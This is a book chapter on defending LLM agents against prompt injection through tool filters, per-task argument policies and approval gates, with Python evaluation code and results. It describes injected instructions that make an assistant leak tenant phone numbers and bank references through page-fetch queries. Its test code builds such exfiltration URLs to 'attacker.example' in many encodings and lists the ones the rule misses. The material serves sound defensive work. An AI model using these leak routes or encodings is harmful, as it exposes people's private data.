---
title: "Securing LLM Applications and Agents"
chapter: "Enforce least privilege outside the model"
chapter_id: least-privilege
book: securing-llm-applications-and-agents
edition: 2026.11.4
verified: 2026-11-22
edition_code: DZ78-8TMV
canonical: https://rollingedition.com/securing-llm-applications-and-agents/least-privilege
license: CC BY-NC 4.0
more_permissions: https://rollingedition.com/policies/reuse
attribution: "“Enforce least privilege outside the model,” chapter 6 of Securing LLM Applications and Agents, Edition 2026.11.4, examples passed Nov 22, 2026. By Rolling Edition, https://rollingedition.com/securing-llm-applications-and-agents/least-privilege. Text CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/), with added permissions (https://rollingedition.com/policies/reuse). Code MIT, copyright Rolling Edition and contributors. Written with AI. Verified by people."
---
# Enforce least privilege outside the model

By the end of this chapter you can restrict an assistant's tools and arguments in code, so that an injected instruction has less to reach, and you can measure each restriction on a fixed set of attack cases and say what it cost the assistant's ordinary tasks. This is the book's treatment of excessive agency (LLM03:2026). The measures here are on the development split, with one held-out run of the three defences in [its own section](#held-out-run), for one model, so each rate describes these sets and not the assistant in general.

[Chapter 5](#the-detector-as-a-filter) found that the filter cut attacks on both splits, at a cost in held-out utility. The attacks that worked did not need a new kind of power. The undefended run shows what they did with the tools the assistant already had. Three of the seven successes fetched a page the task never needed, and they carried a tenant's bank reference or phone number out in the query. The other four went through tools the task did need: a poisoned figure repeated in the reply, and a hidden note that a task fetching pages read. The model cannot tell the user's request from text an attacker placed in the inbox, so the code around the model has to decide which calls it may make and with which arguments.

The controls here work on the model's proposed calls, not on its reasoning. The primary defences come first. Before any control in this chapter runs, the platform decides what the assistant can reach at all: a service account for each assistant with only the access its task needs, API keys scoped to the calls it makes, and the tools that the deployment registers. Each of the chapter's four controls is labelled harness (enforcement). The policies are teaching code and defence in depth. Each fails closed, so a call it cannot check is refused and written to the log.

Every number in the sections below is a dev number, on sixty dev cases and fifteen dev tasks, for the model Qwen3-4B-Instruct-2507, pinned, except the eleven control cases in the control-tokens section and the held-out run, which are marked where they appear. The held-out run replays each defence once on the held-out split, a separate set of cases and tasks. The baseline is the undefended run on the same cases, as [chapter 3](#undefended-baseline) reports it, and each defence is paired with it.

## A tool filter per task {#a-tool-filter-per-task}

A task that never needs a page fetch should not be able to make one, whatever the inbox says. The primary defence is the deployment: the tools it registers for the assistant and the permissions behind them, which bound what any call can reach. The filter in this section narrows that set again, per task, as teaching code. The harness writes each task's tool list from the task's request, puts only those tools in the prompt, and refuses any call to a tool that is not on the list. The list is fixed before the run starts, and the model does not choose it.

Removing a tool from the prompt is different from refusing a call. The model reads a prompt that lists the task's tools and nothing else, so it never sees the names it lacks. That is why the filter changes the run before the model acts. It is also why the filter records no refusals. The filter's run was recorded in full, and the example counts refusals from the trace. A zero there means no call was refused, and the model may never have named a tool it lacked.

Each defence is paired with the baseline on the same cases. Its interval therefore describes the change in each case, computed from the same case in both runs, and not the gap between two separate rates. The method follows [chapter 8 of Evaluating LLM Applications](https://rollingedition.com/evaluating-llm-applications/s/paired-comparisons), which builds its intervals by [bootstrapping over items](https://rollingedition.com/evaluating-llm-applications/s/bootstrap-over-items). This chapter does not re-teach either.

Run the three defences against the baseline, each paired with it on the same cases. The printed lines give each defence's rates, the paired differences, and the refusals by tool.

Example `least-privilege-paired` (Python 3.13.16 · bm25s 0.3.16 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5), passing in Edition 2026.11.4:

```python
"""The three least-privilege defences, each replayed on the 60 dev cases and 15 dev tasks and paired with the baseline.
The line the prose rests on is `enforce-filter, paired difference in attack success`, with its interval beneath it.
"""
from collections import Counter

from lib import cases, report, runs, scorers  # lib first: threads and seeds are fixed here

DEFENCES = ("enforce-filter", "enforce-args", "enforce-approval")


def measure(name):
    """Utility by task ID, attack success by case ID, and refusals by tool in the attack cases, for one defence.
    The baseline is the undefended recording, replayed with no hooks. Each defence's hooks are built per episode from
    its task (lib/variants.py PLANS), so the recording's prompts are rebuilt as the recorder built them."""
    benign, attacks = cases.load_tasks("dev"), cases.load_cases("dev")
    assert (len(benign), len(attacks)) == (15, 60), "the dev split has changed"  # the counts the prose names
    traces_b, traces_a = runs.replay_dev(name, benign, attacks)
    utility = {t.id: scorers.utility(t, traces_b[t.id]) for t in benign}
    success = {c.id: scorers.attack_success(c, traces_a[c.id]) for c in attacks}
    refused_benign = Counter(t for tr in traces_b.values() for t in runs.refused_tools(tr))
    return utility, success, Counter(t for tr in traces_a.values() for t in runs.refused_tools(tr)), refused_benign


def main():
    results = {name: measure(name) for name in ("baseline",) + DEFENCES}
    base_u, base_s = results["baseline"][:2]
    case_ids, task_ids = sorted(base_s), sorted(base_u)
    before, base_util = [base_s[c] for c in case_ids], [base_u[t] for t in task_ids]
    report.rate_lines("baseline, attack success, 60 dev cases", before)
    report.rate_lines("baseline, utility, 15 dev tasks", base_util)
    assert sum(before) > 0, "the baseline has no successes to block"  # the paired measure needs some
    for name in DEFENCES:
        utility, success, refused, refused_benign = results[name]
        after, util = [success[c] for c in case_ids], [utility[t] for t in task_ids]
        report.rate_lines(f"{name}, attack success, 60 dev cases", after)
        report.rate_lines(f"{name}, utility, 15 dev tasks", util)
        report.paired(f"{name}, paired difference in attack success", before, after)
        report.paired(f"{name}, paired difference in utility", base_util, util)
        report.newly_lines(f"{name}, newly blocked, dev cases", f"{name}, newly let through, dev cases", before, after)
        # From the trace's defence events. The total prints at zero too: the filter removes tools from the prompt,
        # so the model may never name a tool it lacks, and no refusal is recorded.
        print(f"{name}, refusals in attack cases, all tools: {sum(refused.values())}")
        print(*(f"{name}, refusals in attack cases, {t}: {n}" for t, n in sorted(refused.items())), sep="\n")
        # The same defence on the benign tasks: a refusal here is a cost to a legitimate task, not a stopped attack.
        print(f"{name}, refusals in benign tasks, all tools: {sum(refused_benign.values())}",
              *(f"{name}, refusals in benign tasks, {t}: {n}" for t, n in sorted(refused_benign.items())), sep="\n")


if __name__ == "__main__":
    main()
```

Output:

```text
baseline, attack success, 60 dev cases: 11.7% (7 of 60)
baseline, attack success, 60 dev cases, interval: [5.0%, 20.0%]
baseline, utility, 15 dev tasks: 93.3% (14 of 15)
baseline, utility, 15 dev tasks, interval: [80.0%, 100.0%]
enforce-filter, attack success, 60 dev cases: 8.3% (5 of 60)
enforce-filter, attack success, 60 dev cases, interval: [1.7%, 15.0%]
enforce-filter, utility, 15 dev tasks: 93.3% (14 of 15)
enforce-filter, utility, 15 dev tasks, interval: [80.0%, 100.0%]
enforce-filter, paired difference in attack success: -3.3 points
enforce-filter, paired difference in attack success, interval: [-10.0, +3.3] points
enforce-filter, paired difference in utility: +0.0 points
enforce-filter, paired difference in utility, interval: [+0.0, +0.0] points
enforce-filter, newly blocked, dev cases: 3
enforce-filter, newly let through, dev cases: 1
enforce-filter, refusals in attack cases, all tools: 0

enforce-filter, refusals in benign tasks, all tools: 0
enforce-args, attack success, 60 dev cases: 6.7% (4 of 60)
enforce-args, attack success, 60 dev cases, interval: [1.7%, 13.3%]
enforce-args, utility, 15 dev tasks: 93.3% (14 of 15)
enforce-args, utility, 15 dev tasks, interval: [80.0%, 100.0%]
enforce-args, paired difference in attack success: -5.0 points
enforce-args, paired difference in attack success, interval: [-11.7, +0.0] points
enforce-args, paired difference in utility: +0.0 points
enforce-args, paired difference in utility, interval: [+0.0, +0.0] points
enforce-args, newly blocked, dev cases: 3
enforce-args, newly let through, dev cases: 0
enforce-args, refusals in attack cases, all tools: 10
enforce-args, refusals in attack cases, book_visit: 1
enforce-args, refusals in attack cases, fetch_page: 3
enforce-args, refusals in attack cases, lookup_tenant: 6
enforce-args, refusals in benign tasks, all tools: 1
enforce-args, refusals in benign tasks, book_visit: 1
enforce-approval, attack success, 60 dev cases: 11.7% (7 of 60)
enforce-approval, attack success, 60 dev cases, interval: [5.0%, 20.0%]
enforce-approval, utility, 15 dev tasks: 93.3% (14 of 15)
enforce-approval, utility, 15 dev tasks, interval: [80.0%, 100.0%]
enforce-approval, paired difference in attack success: +0.0 points
enforce-approval, paired difference in attack success, interval: [+0.0, +0.0] points
enforce-approval, paired difference in utility: +0.0 points
enforce-approval, paired difference in utility, interval: [+0.0, +0.0] points
enforce-approval, newly blocked, dev cases: 0
enforce-approval, newly let through, dev cases: 0
enforce-approval, refusals in attack cases, all tools: 1
enforce-approval, refusals in attack cases, book_visit: 1
enforce-approval, refusals in benign tasks, all tools: 1
enforce-approval, refusals in benign tasks, book_visit: 1
```

On these sixty cases the filter's effect is too small to tell from chance. The paired difference in attack success is -3.3 points, with an interval of [-10.0, +3.3] points. That interval includes zero, so this set does not show that the filter lowered attack success. The filter stopped 3 baseline successes and let through 1 case the baseline had stopped, and the filter refused no call in either set. [The held-out run](#held-out-run) checks the same filter on the held-out split, where its interval also includes zero.

The filter, labelled harness (enforcement), has an effect that falls where the tools fall. The by-goal grouping, which [the approval section](#approval-for-side-effects) uses as well, splits the baseline's successes by goal. The filter stopped 2 of 2 of the bank-reference fetch successes and 1 of 1 of the phone-number fetch successes. It stopped 0 of 3 of the deposit successes and 0 of 1 of the hidden-note success. The four it did not stop used tools the task needed, so the filter had no tool to take away. [Chapter 3](#goals-locations-styles) names the goals. A task whose request needs no page fetch does not get `fetch_page`, so a fetch the injected text asks for has no tool to run through. A filter cannot remove a tool a task legitimately needs, and it cannot remove the model's ability to misuse the arguments of a tool it has. The next section covers those.

The filter also changes the model's behaviour, not only its options. A shorter tool list changes the prompt, so the model's run on each case changes too. The filter let through one case the baseline had stopped, a hidden-note case, and the run changed on that case. The trace doesn't show why, and the measure counts it.

The filter has a known limit. AgentDojo measures a per-task tool filter in section 4.3 of [its paper](https://arxiv.org/html/2406.13352v3), with the figures in its Table 5. Its filter differs from this one in a way that matters: the model chooses the tools, before it reads any untrusted data, and the paper gives the prompt for that choice in its figure 18. This chapter's list is fixed in code. The paper reports a targeted attack success of 6.84% with its filter on GPT-4o, in its Table 5, against 57.69% without it, and its text gives 7.5% for the same defence, so its two figures differ. The paper also says the filter fails when the list of tools cannot be planned in advance, because a tool result can change which tools the task needs, and when the task's own tools are enough for the attack, which it reports as true for 17% of its test cases. This chapter's filter shows the same second limit: four of the seven successes went through tools the task did need. A task that has to read a result before it knows its tools is outside this control. The filter also does not check a tool's description. A tool the task does get can still carry an instruction in its definition, which is the problem of [tool poisoning](https://rollingedition.com/model-context-protocol-in-practice/s/tool-poisoning) in the MCP book, and the chapter on [pinning tool definitions](#pinning-tool-definitions) takes it up.

**Working rule:** Write each task's tool list in code, from the task's request, before the run starts, and put only those tools in the prompt. Refuse any call to a tool outside that list and log it. A task that cannot name its tools before it reads data is outside this control, and its design should say so.

## Argument policies {#argument-policies}

A tool the task needs can still be misused through its arguments: the right tool, sent to the wrong recipient, or carrying a value the task never named. The primary defence is the platform's scoped credentials. An API key that can post to one endpoint, under one service account, bounds what a call can do before any argument is read. The argument policy adds a check on each call's arguments. It is written for one task, from that task's request and the tool schemas, and it runs on every call, including repeated ones. Saltzer and Schroeder's design principles ask for two things here: least privilege, to limit the damage an error can do, and fail-safe defaults, so that access is granted by permission and the default is none ([Saltzer and Schroeder](https://web.mit.edu/Saltzer/www/publications/protection/Basic.html), section I.A.3, principles f and b). The policy here is labelled harness (enforcement) and is teaching code. It fails closed: if it cannot read a call, it refuses it.

The rules follow the request. `send_message` may go only to the recipients the task names, and `lookup_tenant` only to a unit the task names. `book_visit` is checked against the ticket and slot the request names, because a valid slot for another ticket still passes the schema. `fetch_page` is checked against the office's own fixture hosts. Its query, path and fragment are checked for the tenant's phone number and for the full bank reference, in plain, percent-encoded and several other forms, and the next subsection says which forms pass. The schema alone cannot tell a right slot from a wrong one, which is why the rules are written from the request.

Two limits are outside the measure. The policy has no rule for `list_slots`, so its arguments go to the contractor's server unchecked, and a value the injected text puts in `date_from` leaves the office with them. And the fetch rule checks only the phone number and the full bank reference. The tenant's name, rent balance and portal key pass.

The policy runs in the same paired measure as the filter, which [the filter section](#a-tool-filter-per-task) introduces, and its refusals are counted by tool.

With the argument policy, the paired difference in attack success is -5.0 points, with an interval of [-11.7, +0.0] points. The interval's upper end sits at zero, so this set cannot rule out that the policy changed nothing. The policy stopped 3 baseline successes and let through 0. [The held-out run](#held-out-run) shows the same policy with its upper end again at zero.

The policy refused 10 calls across the attack cases: 6 to `lookup_tenant`, 3 to `fetch_page` and 1 to `book_visit`.

The `lookup_tenant` refusals are the policy at work on a pattern the undefended run showed. In some dev cases the model looked up a tenant the injected text named, and then did only the user's task, as [chapter 3](#undefended-baseline) shows. A lookup refused by unit never returns that tenant's record, so the record does not enter the context. The scorers did not count those lookups as successes in the first place, and the policy still removes them.

The fetch rule is the policy's weak point, and its misses are measured.

Example `argument-policy-bypasses` (Python 3.13.16 · bm25s 0.3.16 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5), passing in Edition 2026.11.4:

```python
"""The argument policy's fetch rule, run directly on one tenant's phone number in six forms, with no model and no recording.
The rule now reads the path as well as the query, so a value in the path, on the office host, is refused. Two forms
stay allowed and are the stated limits: base64, and a partial value (the last six digits).
"""
import base64
import json
from urllib.parse import quote, urlsplit

from lib import cases, defences, harness  # lib first: threads and seeds are fixed here


def main():
    world, task = cases.load_world(), cases.load_tasks("dev")[0]
    tenant = world.tenants[0]  # a tenant the task does not name, so the rule is what decides
    digits = "".join(c for c in tenant.phone if c.isdigit())
    assert digits not in "".join(c for c in task.text if c.isalnum()), "the task names the tenant"
    forms = {  # each form is a path and query only; the host is added below
        "base64": f"/log?p={base64.b64encode(digits.encode()).decode()}",
        "in the path": f"/ref/{digits}",
        "partial": f"/log?p={digits[-6:]}",
        "percent-encoded": f"/log?p={quote(tenant.phone)}",
        "plain": f"/log?p={digits}",
        "with spaces": f"/log?p={tenant.phone.replace(' ', '+')}",  # a space written as a plus sign
    }
    office = urlsplit(json.loads((cases.DATA / "pages.json").read_text(encoding="utf-8"))["pages"][0]["url"]).hostname
    decide = defences.argument_policy(task, world)
    allowed = {}
    for name in sorted(forms):
        for label, host in (("office", office), ("attacker", "attacker.example")):
            decision = decide({"name": "fetch_page", "arguments": {"url": f"https://{host}{forms[name]}"}})
            allowed[(name, label)] = isinstance(decision, harness.Allow)
            print(f"{name}, {label} host: {'allowed' if allowed[(name, label)] else 'refused'}")
    # The host rule refuses every form on the attacker's host; on the office host two forms are stated limits.
    assert not any(v for (_, label), v in allowed.items() if label == "attacker"), "a form reached the attacker host"
    missed = sorted(name for (name, label), v in allowed.items() if label == "office" and v)
    print(f"forms allowed on the office host: {len(missed)} of {len(forms)}")
    assert missed == ["base64", "partial"], f"the policy misses {missed}, not the stated limits"


if __name__ == "__main__":
    main()
```

Output:

```text
base64, office host: allowed
base64, attacker host: refused
in the path, office host: refused
in the path, attacker host: refused
partial, office host: allowed
partial, attacker host: refused
percent-encoded, office host: refused
percent-encoded, attacker host: refused
plain, office host: refused
plain, attacker host: refused
with spaces, office host: refused
with spaces, attacker host: refused
forms allowed on the office host: 2 of 6
```

The rule is run directly, with no model, on one tenant's phone number in six forms, to the office's fixture host and to `attacker.example`. Each line prints a form and whether the call is allowed. On the attacker's host every form was refused, because the host rule refuses any host the office does not own. On the office's host the rule refused four forms, the plain, percent-encoded and spaced forms and the number in the path, and allowed two: the number in base64, and a partial number, its last six digits. The printed count is 2 of 6.

Example `least-privilege-regressions` (Python 3.13.16 · bm25s 0.3.16 · huggingface-hub 2.4.0 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5 · tokenizers 0.23.3), passing in Edition 2026.11.4:

```python
"""The least-privilege regressions for the chapter's security review (findings S6-1 and S6-3), with no model and no recording.

S6-1: the fetch rule refuses one tenant's phone number in the forms the review lists, in the path and the fragment as
well as the query. Three stay open and are asserted as limits: base64, hex and partial digits (other encodings and a
partial value). A value split across two fetches is asserted as a limit too. The attempts, with their expected
verdicts, are in data/regressions/least-privilege.json.
S6-3: with special_in_untrusted=False, the chat marker's token ID comes only from the markers the harness writes. The
baseline (special_in_untrusted=True) is run on the same paths as a control: there the injected marker does reach the model.
The control paths are checked in lib/regressions.py.

Prints one verdict per attempt, sorted, by name only. Prints no phone numbers and no attack text.
"""
import json
from urllib.parse import urlsplit

from lib import cases, defences, harness, regressions  # lib first: threads and seeds are fixed here

MARKER = 151644  # the chat marker's id on the pinned tokenizer


def main():
    world, task = cases.load_world(), next(t for t in cases.load_tasks("dev") if t.id == "t-20")
    doc = regressions.load("least-privilege")
    tenant = world.tenant(doc["tenant"])  # a tenant the task does not name, so the rule is what decides
    assert "".join(c for c in tenant.phone if c.isdigit()) not in task.text, "the task names the tenant"
    decide = defences.argument_policy(task, world)
    office = urlsplit(json.loads((cases.DATA / "pages.json").read_text(encoding="utf-8"))["pages"][0]["url"]).hostname

    verdicts = {}
    for a in doc["attempts"]:
        host = office if a["host"] == "office" else a["host"]
        ok = [isinstance(decide({"name": "fetch_page", "arguments": {"url": f"https://{host}{p}"}}), harness.Allow)
              for p in a["paths"]]
        verdicts[a["name"]] = "allowed" if all(ok) else "refused"
        assert verdicts[a["name"]] == a["expected"], f"{a['name']} is {verdicts[a['name']]}, expected {a['expected']}"
    regressions.report(verdicts | regressions.control_verdicts(MARKER))

    # S6-6: a unit with a leading space. The tool strips and upper-cases the unit before it looks the tenant up, so the
    # policy must allow the same unit with the space, or a benign lookup is refused for no reason.
    unit_task = next(t for t in cases.load_tasks() if t.refs.get("tenant") and world.tenant(t.refs["tenant"]).unit == "2H")
    lookup = defences.argument_policy(unit_task, world)({"name": "lookup_tenant", "arguments": {"unit": " 2H"}})
    print(f"S6-6 lookup_tenant with a leading-space unit: {'allowed' if isinstance(lookup, harness.Allow) else 'refused'}")
    assert isinstance(lookup, harness.Allow), "the policy refuses a unit the tool would have matched"


if __name__ == "__main__":
    main()
```

Output:

```text
control, baseline: error message: extra marker
control, baseline: model reply: extra marker
control, baseline: refusal reason: extra marker
control, baseline: sender field: extra marker
control, baseline: system prompt: extra marker
control, baseline: task text: extra marker
control, baseline: tool description: extra marker
control, baseline: untrusted body: extra marker
control, fixed: error message: no extra marker
control, fixed: model reply: no extra marker
control, fixed: refusal reason: no extra marker
control, fixed: sender field: no extra marker
control, fixed: system prompt: no extra marker
control, fixed: task text: no extra marker
control, fixed: tool description: no extra marker
control, fixed: untrusted body: no extra marker
fetch, attacker host: 0044 prefix: refused
fetch, attacker host: 44 prefix: refused
fetch, attacker host: base64: refused
fetch, attacker host: double percent: refused
fetch, attacker host: full-width digits: refused
fetch, attacker host: hex: refused
fetch, attacker host: html entities: refused
fetch, attacker host: in the fragment: refused
fetch, attacker host: in the path: refused
fetch, attacker host: letters between digits: refused
fetch, attacker host: partial: refused
fetch, attacker host: percent-encoded once: refused
fetch, attacker host: plain: refused
fetch, attacker host: plus signs: refused
fetch, attacker host: plus-44 prefix: refused
fetch, attacker host: reversed: refused
fetch: 0044 prefix: refused
fetch: 44 prefix: refused
fetch: base64: allowed
fetch: double percent: refused
fetch: full-width digits: refused
fetch: hex: allowed
fetch: html entities: refused
fetch: in the fragment: refused
fetch: in the path: refused
fetch: letters between digits: refused
fetch: partial: allowed
fetch: percent-encoded once: refused
fetch: plain: refused
fetch: plus signs: refused
fetch: plus-44 prefix: refused
fetch: reversed: refused
fetch: split across two fetches: allowed
S6-6 lookup_tenant with a leading-space unit: allowed
```

The regressions extend the same rule to the forms the review of this chapter found. It asserts a verdict for each one, and the rule refuses the number in the query, the path and the fragment in the plain, percent-encoded, signed, prefixed, doubled, full-width, entity, letter-separated and reversed forms. Four stay allowed, and the example asserts them as limits: the number in base64, the number as hex, a partial number, and a value split across two fetches, where each fetch is judged alone. The forms are printed by name only, and this chapter does not print a number.

These misses are measured for the rule alone. The crafted calls are not part of the attack set, so the examples do not say how often an attacker would use these encodings on this set. What they show is that a rule on the values in a call is not a rule on the content of the call. This policy's host rule does what chapter 1's [outbound allowlist](#an-outbound-allowlist) does, and it refused the attacker's host in every form. What neither checks is the content of a call to the office's own host, which is handled by [egress rules](#egress-rules) in chapter 7. That chapter adds a query rule for that host and leaves its effect unmeasured on this set.

**Working rule:** Write one policy per task, from its request and its schemas. Run it on every call, repeated ones included, and refuse any call it cannot read. Test the policy against the encodings an attacker would try on your own hosts, and write down each form it allows, because a rule on the values in a call is not a rule on its content.

## Approval for side effects {#approval-for-side-effects}

A side effect is a call that does harm when it lands, so the harness places a gate in front of it. The primary defence is the approval gate that a harness places before a side effect. This control is labelled harness (enforcement). The gate a person answers belongs to [Agent Harnesses' gate](https://rollingedition.com/agent-harnesses/s/gate-in-finish), which this chapter links and does not teach again. The gate's approval is bound to one request, and a guard around every tool catches a change that bypassed the gate ([bound approval](https://rollingedition.com/agent-harnesses/s/bound-approval), [the wrapper](https://rollingedition.com/agent-harnesses/s/wrapper)). An [allow list](https://rollingedition.com/agent-harnesses/s/allow-lists) would skip that gate for the tools on it, so this section's approval covers the two side-effecting tools the task set has, `send_message` and `book_visit`, and no allow list skips it.

The book's gate classes `fetch_page` as a read-only tool, so the approval never saw a page fetch. That is a design choice, and it is why the gate saw none of the fetch attacks. A fetch whose query carries data out of the office is an outbound side effect, though, and the working rule below counts it as one.

In this book, the approver is simulated. It approves a `send_message` or a `book_visit` only when the argument policy would allow that call, and it records an approval event either way. A real approver is a person, and a person makes mistakes that a simulation which approves exactly what the policy allows does not model. So the numbers below show what the approval step changes when it approves correctly, and they say nothing about how often a person would approve a bad call.

The approval step runs in the same paired measure as the other two, which [the filter section](#a-tool-filter-per-task) introduces.

With the approval step, attack success on the dev cases was 11.7% (7 of 60), the same as the baseline. The paired difference is +0.0 points. It stopped 0 baseline successes. The by-goal count explains why, and the grouping below is the one the approval numbers need.

Example `least-privilege-by-goal` (Python 3.13.16 · bm25s 0.3.16 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5), passing in Edition 2026.11.4:

```python
"""Which goals each least-privilege defence can see: the baseline's successful attacks that each defence stops, by goal.
The lines the prose rests on are `enforce-filter, baseline successes blocked, all goals`, read against the baseline's
total, and the two gated-call lines, which say where the approval step could have acted.
"""
from lib import cases, report, runs, scorers  # lib first: threads and seeds are fixed here

DEFENCES = ("enforce-filter", "enforce-args", "enforce-approval")
GATED = ("send_message", "book_visit")  # the side-effecting tools the approval step covers


def successes(name, keep=None):
    """Attack success by case ID on the 60 dev cases, for the baseline or one defence (runs.replay_dev). With `keep`,
    a dict is filled with each case's trace."""
    attacks = cases.load_cases("dev")
    assert len(attacks) == 60, "the dev split has changed"  # the count the prose names
    traces = runs.replay_dev(name, (), attacks)[1]  # no benign tasks: only the attack traces are scored here
    if keep is not None:
        keep.update(traces)
    return {c.id: scorers.attack_success(c, traces[c.id]) for c in attacks}


def main():
    goal = {c.id: c.goal for c in cases.load_cases("dev")}
    base_traces = {}
    base = successes("baseline", keep=base_traces)
    won = sorted(c for c in base if base[c])  # the baseline's successes: the only cases a defence can block
    print(f"baseline successes, 60 dev cases: {len(won)}")
    gated = [c for c in won if any(base_traces[c].tool_calls(t) for t in GATED)]  # successes that called a gated tool
    print(f"baseline successes that made a gated call, all goals: {len(gated)} of {len(won)}")
    for name in DEFENCES:
        after = successes(name)
        blocked = [c for c in won if not after[c]]
        if name == "enforce-approval":  # the approval step gates side effects only, so it can block a success only through one
            assert not blocked, "the approval step blocked a baseline success"
            print(f"{name}, baseline successes with a gated call blocked, all goals: "
                  f"{sum(c in blocked for c in gated)} of {len(gated)}")
        # one line per goal, with the baseline successes in that goal
        rows = report.count_by(won, lambda c: goal[c], lambda c: c in blocked)
        report.print_counts(f"{name}, baseline successes blocked, goal", rows)
        print(f"{name}, baseline successes blocked, all goals: {len(blocked)} of {len(won)}")


if __name__ == "__main__":
    main()
```

Output:

```text
baseline successes, 60 dev cases: 7
baseline successes that made a gated call, all goals: 2 of 7
enforce-filter, baseline successes blocked, goal g-bank-fetch: 2 of 2
enforce-filter, baseline successes blocked, goal g-deposit: 0 of 3
enforce-filter, baseline successes blocked, goal g-hidden: 0 of 1
enforce-filter, baseline successes blocked, goal g-phone-fetch: 1 of 1
enforce-filter, baseline successes blocked, all goals: 3 of 7
enforce-args, baseline successes blocked, goal g-bank-fetch: 2 of 2
enforce-args, baseline successes blocked, goal g-deposit: 0 of 3
enforce-args, baseline successes blocked, goal g-hidden: 0 of 1
enforce-args, baseline successes blocked, goal g-phone-fetch: 1 of 1
enforce-args, baseline successes blocked, all goals: 3 of 7
enforce-approval, baseline successes with a gated call blocked, all goals: 0 of 2
enforce-approval, baseline successes blocked, goal g-bank-fetch: 0 of 2
enforce-approval, baseline successes blocked, goal g-deposit: 0 of 3
enforce-approval, baseline successes blocked, goal g-hidden: 0 of 1
enforce-approval, baseline successes blocked, goal g-phone-fetch: 0 of 1
enforce-approval, baseline successes blocked, all goals: 0 of 7
```

On dev, the approval step stopped 0 of 7 of the baseline's successes, and the example asserts that zero from the data. Only 2 of 7 of the seven made a gated call. On dev, both were the user's own request, a reply to the tenant the task named and the requested booking, so the approver passed them, correctly. The harm reached the user through the reply text in both cases. The approval step blocked 0 of 2 of those two. Five of the seven successes never called a gated tool at all. They used the page fetch, which this gate does not cover, and a reply that repeated a poisoned figure. A gate on side effects does not see an attack that leaves through a read-only tool or through the reply. That is what [chapter 7](#exfiltration-channels) is for. On dev, the approval step refused 1 call, a `book_visit` on a case the baseline had already failed, so it changed no outcome. [The held-out run](#held-out-run) shows the step can stop a gated attack, which the dev account above does not explain.

**Working rule:** Put the approval on every tool with a side effect, and count a fetch that carries data out as one. Measure which attacks the approval stops and which it lets through. An approval that stops nothing in your measure is telling you where the attacks went, so read the traces before you add tools to the gate or trust the gate with more.

## The held-out run {#held-out-run}

The three defences were run once more on the held-out split: sixty held-out cases and fifteen held-out tasks, with the same baseline and the same paired measure.

Example `least-privilege-held-out` (Python 3.13.16 · bm25s 0.3.16 · linkify-it-py 2.2.0 · markdown-it-py 4.3.0 · numpy 2.5.5), passing in Edition 2026.11.4:

```python
"""The three least-privilege defences, each replayed on the 60 held-out cases and 15 held-out tasks and paired with the
baseline. The held-out split was not used to choose any defence or its settings, so these lines test the dev results.
The lines the prose rests on are the held-out paired differences, and the approval step's gated-call counts.
"""
from lib import cases, replay, report, runs, scorers  # lib first: threads and seeds are fixed here

DEFENCES = ("enforce-filter", "enforce-args", "enforce-approval")
GATED = ("send_message", "book_visit")  # the side-effecting tools the approval step covers


def traces(name, benign, attacks):
    """Task traces and case traces for the baseline or one defence, replayed from its held-out recording."""
    if name == "baseline":
        return runs.replay_tasks("baseline-held-out", benign), runs.replay_cases("baseline-held-out", attacks)
    model = replay.ReplayModel(f"{name}-held-out")  # one model per recording: it reads its file once
    return (runs.replay_tasks(f"{name}-held-out", benign, variant=name, model=model),
            runs.replay_cases(f"{name}-held-out", attacks, variant=name, model=model))


def main():
    benign, attacks = cases.load_tasks("held-out"), cases.load_cases("held-out")
    assert (len(benign), len(attacks)) == (15, 60), "the held-out split has changed"  # the counts the prose names
    task_ids, case_ids = sorted(t.id for t in benign), sorted(c.id for c in attacks)
    by_task, by_case = {t.id: t for t in benign}, {c.id: c for c in attacks}

    def score(name):
        tb, ta = traces(name, benign, attacks)
        util = [scorers.utility(by_task[t], tb[t]) for t in task_ids]
        success = [scorers.attack_success(by_case[c], ta[c]) for c in case_ids]
        return util, success, ta

    base_util, before, base_traces = score("baseline")
    report.rate_lines("baseline, attack success, 60 held-out cases", before)
    report.rate_lines("baseline, utility, 15 held-out tasks", base_util)
    won = [i for i, hit in enumerate(before) if hit]  # the baseline's successes: the only cases a defence can block
    gated = [i for i in won if any(base_traces[case_ids[i]].tool_calls(t) for t in GATED)]
    print(f"baseline successes that made a gated call, held-out: {len(gated)} of {len(won)}")
    for name in DEFENCES:
        util, after, _ = score(name)
        report.rate_lines(f"{name}, attack success, 60 held-out cases", after)
        report.rate_lines(f"{name}, utility, 15 held-out tasks", util)
        report.paired(f"{name}, paired difference in attack success, held-out", before, after)
        report.paired(f"{name}, paired difference in utility, held-out", base_util, util)
        report.newly_lines(f"{name}, newly blocked, held-out cases", f"{name}, newly let through, held-out cases",
                           before, after)
        if name == "enforce-approval":
            blocked = [i for i in gated if not after[i]]  # gated successes the approval step stopped
            print(f"{name}, held-out successes that used a gated tool: {len(gated)}")
            print(f"{name}, held-out gated successes blocked: {len(blocked)}")


if __name__ == "__main__":
    main()
```

Output:

```text
baseline, attack success, 60 held-out cases: 11.7% (7 of 60)
baseline, attack success, 60 held-out cases, interval: [3.3%, 20.0%]
baseline, utility, 15 held-out tasks: 66.7% (10 of 15)
baseline, utility, 15 held-out tasks, interval: [40.0%, 86.7%]
baseline successes that made a gated call, held-out: 4 of 7
enforce-filter, attack success, 60 held-out cases: 11.7% (7 of 60)
enforce-filter, attack success, 60 held-out cases, interval: [3.3%, 20.0%]
enforce-filter, utility, 15 held-out tasks: 73.3% (11 of 15)
enforce-filter, utility, 15 held-out tasks, interval: [46.7%, 93.3%]
enforce-filter, paired difference in attack success, held-out: +0.0 points
enforce-filter, paired difference in attack success, held-out, interval: [-8.3, +8.3] points
enforce-filter, paired difference in utility, held-out: +6.7 points
enforce-filter, paired difference in utility, held-out, interval: [-13.3, +33.3] points
enforce-filter, newly blocked, held-out cases: 3
enforce-filter, newly let through, held-out cases: 3
enforce-args, attack success, 60 held-out cases: 8.3% (5 of 60)
enforce-args, attack success, 60 held-out cases, interval: [1.7%, 16.7%]
enforce-args, utility, 15 held-out tasks: 66.7% (10 of 15)
enforce-args, utility, 15 held-out tasks, interval: [40.0%, 86.7%]
enforce-args, paired difference in attack success, held-out: -3.3 points
enforce-args, paired difference in attack success, held-out, interval: [-8.3, +0.0] points
enforce-args, paired difference in utility, held-out: +0.0 points
